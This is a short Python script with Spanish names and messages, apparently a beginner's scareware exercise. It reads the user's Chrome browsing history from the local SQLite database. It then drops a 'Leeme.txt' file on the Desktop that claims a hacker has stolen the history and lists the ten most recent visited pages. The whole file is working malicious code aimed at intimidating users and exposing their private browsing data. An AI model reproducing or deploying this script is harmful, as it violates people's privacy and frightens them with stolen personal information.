import os
import random
import time
import sqlite3
import pathlib


NOMBRE_ARCHIVO = "Leeme.txt"


def get_user_path():
    return "{}".format(pathlib.Path.home())


def get_chrome_data(user_path):
    urls = None
    while not urls:
        try:
            ch_history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
            con = sqlite3.connect(ch_history_path)
            cursor = con.cursor()
            cursor.execute("SELECT title, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            con.close()
            return urls
        except sqlite3.OperationalError:
            print("La base de datos esta bloqueada, reintentando en 5 segundos")
            time.sleep(5)


def scare_user(hacker_doc, chrome_history):
    for url in chrome_history[:10]:
        hacker_doc.write("He visto que has entrado en: {} | {}\n".format(url[0], url[1]))


def delay():
    n_hours = random.randrange(1, 2)
    n_min = random.randrange(1, 2)
    # print("Dormiremos {} horas y  {} minutos".format(n_hours, n_min))
    # time.sleep(n_hours + n_min)


def crear_archivo(user_path):
    hacker_doc = open(user_path + "\\Desktop\\" + NOMBRE_ARCHIVO, "w", encoding="utf-8")
    hacker_doc.write("Soy un hacker y te he robado el historial de google chrome\n\n")
    return hacker_doc


def main():
    user_path = get_user_path()
    delay()
    hacker_doc = crear_archivo(user_path)
    chrome_history = get_chrome_data(user_path)
    scare_user(hacker_doc, chrome_history)


if __name__ == "__main__":
    main()
